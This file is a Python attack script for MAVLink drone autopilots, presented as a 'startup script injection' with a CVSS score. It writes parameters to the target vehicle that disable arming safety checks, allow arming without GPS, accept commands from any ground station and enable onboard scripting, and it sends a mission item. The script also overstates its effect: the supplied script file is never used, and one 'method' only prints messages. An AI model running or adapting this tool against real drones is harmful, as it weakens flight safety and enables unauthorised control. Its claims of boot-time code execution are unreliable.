#!/usr/bin/env python3
"""
Startup Script Injection
Inject malicious scripts into drone startup process

Injects code or commands into the drone's startup sequence to
execute malicious code on every boot.

CVSS Score: 7.5 (High)
Affected: Autopilots with script execution capability
"""

import sys
import time
from pymavlink import mavutil

def inject_startup_script(connection_string, script_content=None):
    """
    Inject script into startup process
    
    Args:
        connection_string: MAVLink connection string
        script_content: Script content to inject (optional)
    """
    try:
        print("[*] Startup Script Injection Attack")
        print(f"[*] Connecting to {connection_string}...")
        
        # Use helper function for connection
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        
        master = connect_to_drone(connection_string, timeout=5)
        if master is None:
            return False
        print("[+] Connected to vehicle")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print("[*] Attempting startup script injection...")
        
        # Method 1: Modify parameters that execute on startup
        print("[*] Method 1: Modifying startup parameters...")
        
        startup_params = {
            'SCR_ENABLE': 1,  # Enable scripting (if supported)
            'SCR_HEAP_SIZE': 100000,  # Script heap size
            'SCR_VM_I_COUNT': 20000,  # VM instruction count
        }
        
        for param_name, param_value in startup_params.items():
            try:
                master.mav.param_set_send(
                    target_system,
                    target_component,
                    param_name.encode('utf-8'),
                    param_value,
                    mavutil.mavlink.MAV_PARAM_TYPE_UINT32
                )
                time.sleep(0.2)
                print(f"[+] Startup parameter set: {param_name}")
            except Exception as e:
                print(f"[-] Failed to set {param_name}: {e}")
        
        # Method 2: Inject via mission (some systems execute mission on boot)
        print("[*] Method 2: Injecting via mission...")
        
        try:
            # Create mission that executes on startup
            master.mav.mission_item_send(
                target_system,
                target_component,
                0,
                0,  # MAV_FRAME_GLOBAL
                16,  # MAV_CMD_NAV_WAYPOINT
                0, 0, 0, 0, 0, 0,
                0, 0, 0
            )
            print("[+] Startup mission injected")
        except Exception as e:
            print(f"[-] Mission injection failed: {e}")
        
        # Method 3: Modify boot parameters
        print("[*] Method 3: Modifying boot parameters...")
        
        boot_params = {
            'SYSID_MYGCS': 255,  # Accept any GCS
            'ARMING_CHECK': 0,  # Disable checks on boot
            'COM_ARM_WO_GPS': 1,  # Allow arming without GPS
        }
        
        for param_name, param_value in boot_params.items():
            try:
                master.mav.param_set_send(
                    target_system,
                    target_component,
                    param_name.encode('utf-8'),
                    param_value,
                    mavutil.mavlink.MAV_PARAM_TYPE_UINT32
                )
                time.sleep(0.2)
            except:
                pass
        
        print("[+] Boot parameters modified")
        
        # Method 4: Exploit script execution (if supported)
        print("[*] Method 4: Attempting script execution injection...")
        print("[*] Note: Requires autopilot with script execution support")
        print("[*] Falling back to parameter-based persistence...")
        
        print()
        print("[+] Startup script injection completed")
        print("[!] Modified parameters will persist across reboots")
        print("[!] System will execute injected configuration on next boot")
        
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 startup_script_injection.py <connection> [script_file]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  script_file   Optional script file to inject")
        print("\nExamples:")
        print("  python3 startup_script_injection.py udp:127.0.0.1:14550")
        print("\nStartup Script Injection")
        print("CVSS Score: 7.5 (High)")
        print("Affected: Autopilots with script execution capability")
        sys.exit(1)
    
    connection = sys.argv[1]
    script_file = sys.argv[2] if len(sys.argv) > 2 else None
    
    script_content = None
    if script_file:
        try:
            with open(script_file, 'r') as f:
                script_content = f.read()
        except Exception as e:
            print(f"[-] Failed to read script file: {e}")
    
    inject_startup_script(connection, script_content)

if __name__ == "__main__":
    main()
